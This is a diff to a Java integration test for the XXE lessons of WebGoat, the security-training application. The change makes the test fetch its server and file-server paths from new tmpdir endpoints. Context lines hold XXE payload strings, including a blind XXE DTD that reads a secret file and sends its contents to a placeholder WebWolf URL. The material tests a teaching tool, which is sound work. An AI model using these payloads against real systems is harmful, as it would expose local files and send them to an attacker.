@@ -17,13 +17,16 @@ public class XXETest extends IntegrationTest {
     private static final String dtd7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"file:SECRET\"><!ENTITY % all \"<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>\">%all;";
     private static final String xxe7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM \"WEBWOLFURL/USERNAME/blind.dtd\">%remote;]><comment><text>test&send;</text></comment>";
     
-    private String webGoatHomeDirectory = System.getProperty("user.dir").concat("/target/.webgoat");
-    private String webwolfFileDir = System.getProperty("user.dir").concat("/target/webwolf-fileserver");
+    private String webGoatHomeDirectory;
+    private String webwolfFileDir;
     
     
     @Test
     public void runTests() throws IOException {
         startLesson("XXE");
+        
+        webGoatHomeDirectory = getWebGoatServerPath();
+        webwolfFileDir = getWebWolfServerPath();
         
         checkAssignment(url("/WebGoat/xxe/simple"),ContentType.XML,xxe3,true);
         
@@ -79,4 +82,32 @@ public class XXETest extends IntegrationTest {
         return result;
     }
     
+    private String getWebGoatServerPath() throws IOException {
+    	
+    	//read path from server
+        String result = RestAssured.given()
+        .when()
+        .config(restConfig)
+        .cookie("JSESSIONID", getWebGoatCookie())
+        .get(url("/WebGoat/xxe/tmpdir"))
+        .then()
+        .extract().response().getBody().asString();
+        result = result.replace("%20", " ");
+        return result;
+    }
+    
+    private String getWebWolfServerPath() throws IOException {
+    	
+    	//read path from server
+        String result = RestAssured.given()
+        .when()
+        .config(restConfig)
+        .cookie("WEBWOLFSESSION", getWebWolfCookie())
+        .get(webWolfUrl("/tmpdir"))
+        .then()
+        .extract().response().getBody().asString();
+        result = result.replace("%20", " ");
+        return result;
+    }
+        
 }
